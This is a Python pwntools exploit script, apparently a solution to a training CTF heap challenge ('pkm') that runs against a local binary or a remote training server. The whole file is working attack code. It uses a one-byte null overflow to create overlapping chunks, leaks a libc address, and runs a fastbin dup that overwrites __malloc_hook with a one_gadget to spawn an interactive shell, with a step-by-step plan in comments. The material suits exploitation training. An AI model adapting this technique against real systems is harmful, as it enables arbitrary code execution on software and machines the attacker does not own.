from pwn import *

# You can do a bunch of things with this program, but a lot of them are useless :/
# However, the important part is that you can create, delete and rename pkms: renaming them implies freeing the chunk containing the old name and creating a new one. Each time before you change a name, you are asked the length of the chunk to create. After finishing writing the name a \0 is appended after the last written char (=>pnb!).

CHALL_PATH = "./pkm_patched"
CHALL = ELF(CHALL_PATH, checksec = False)
LIBC_PATH = "/home/merk/odc/env/libc-2.23.so"
LIBC = ELF(LIBC_PATH, checksec = False)
COMMANDS = """
b add_pkm
b rename_pkm
b delete_pkm
b info_pkm
c
"""
# COMMANDS = """
# b get_string
# b new_pkm
# c
# """

def add_pkm(c) :
    c.recvuntil(b"> ")
    c.sendline(b'0')

def rename_pkm(c, index, len, name, newline = True) :
    c.recvuntil(b"> ")
    c.sendline(b'1')
    c.recvuntil(b"> ")
    c.sendline(str(index).encode("utf-8"))
    c.recvuntil(b"length: ")
    c.sendline(str(len).encode("utf-8"))
    
    if newline :
        c.sendline(name)
    else :
        c.send(name)

def delete_pkm(c, index) :
    c.recvuntil(b"> ")
    c.sendline(b'2')
    c.recvuntil(b"> ")
    c.sendline(str(index).encode("utf=8"))

def info_pkm(c, index) :
    c.recvuntil(b"> ")
    c.sendline(b'4')
    c.recvuntil(b"> ")
    c.sendline(str(index).encode("utf=8"))
    return c.recvline()

if args.REMOTE:
    c = remote("pkm.training.offensivedefensive.it", 8080, ssl=True)
else:
    if args.GDB:
        c = gdb.debug(CHALL_PATH, gdbscript = COMMANDS)
    else:
        c = process(CHALL_PATH)

# Phase 1.
add_pkm(c)      # Index 0
add_pkm(c)      # Index 1
add_pkm(c)      # Index 2
add_pkm(c)      # Index 3
add_pkm(c)      # Index 4

# Phase 2.
rename_pkm(c, 4, 0x60, b"Chiogre")      # For avoiding fastbin dub being detected
rename_pkm(c, 0, 0x18, b"Pikachu")      # Chunk A

# Phase 3.
name = b'R' * 0x1f0 + p64(0x200)
rename_pkm(c, 1, 0x250, name)           # Chunk B

# Phase 4.
add_pkm(c)      # Index 5, chunk C

# Phase 5.
rename_pkm(c, 1, 0x300, b"Pichu")       # Free(B)

# Phase 6.
name = b'P' * 0x18
rename_pkm(c, 0, 0x18, name, False)     # 1B overflow

# Phase 7.
rename_pkm(c, 2, 0x180, b"Meowth")      # Chunk B1

# Phase 8.
rename_pkm(c, 3, 0x60, b"Charmaleon")   # Chunk B2

# Phase 9.
rename_pkm(c, 2, 0x300, b"Charizard")   # Free(B1)

# Phase 10.
delete_pkm(c, 5)        # Free(C)

# Phase 11.
rename_pkm(c, 2, 0x180, b"Piplup")

# Phase 12.
leak = info_pkm(c, 3)[8:14].ljust(8, b'\x00')
leak = u64(leak)
print("LIBC leak: ", hex(leak))
LIBC.address = leak - 0x3C4B78
print("LIBC base: ", hex(LIBC.address))

if LIBC.address > 0x700000000000:
    # Phase 13a. fastbin dup attack with 1st gadget
    rename_pkm(c, 0, 0x60, b"Raichu")
    rename_pkm(c, 0, 0x300, b"Megabulbasauromatafackaaaaaaa")
    rename_pkm(c, 4, 0x300, b"Rayquaza")

    up_malloc_hook = LIBC.address + 0x3C4AED
    print("Up malloc hook: ", hex(up_malloc_hook))
    rename_pkm(c, 3, 0x60, p64(up_malloc_hook))
    rename_pkm(c, 0, 0x60, b"Lucario")
    # print("Watch out!")
    rename_pkm(c, 2, 0x60, b"Exeggcutor")

    gadget = LIBC.address + 0x4527a
    print("Gadget: ", hex(gadget))
    rename_pkm(c, 1, 0x60, b'M'*0x13 + p64(gadget))

    c.interactive()

# Libc one_gadgets:
# 0x4527a
# 0xf03a4
# 0xf1247

# Plan:
# 1. create a 4 pkm (+1 for later use)
# 2. rename pkm 0 => chunk A
# 3. rename pkm 1 (long name) => chunk B
# 4. create a new pkm (5th one) => chunk C
# 5. rename pkm 1 with a name larger than the previous one to leave chunk B as a bin => free(B)
# 6. rename pkm 0 to perform 1 byte overflow
# 7. rename pkm 2 (len > 0x80) => chunk B1
# 8. rename pkm 3 (any len) => chunk B2
# 9. rename pkm 2 with a name larger than the previous one to leave chunk B1 as a bin => free(B1)
# 10. delete pkm 5 => free(C)
# 11. rename pkm 2 to overflow 0x10 bytes of B2
# 12. print info of pkm 2 to leak the main arena address and compute the libc base address
# 13a. try fastbin dup attack to overwrite the malloc hook address with a onegadget
# 13b. try to overwrite got entries with a onegadget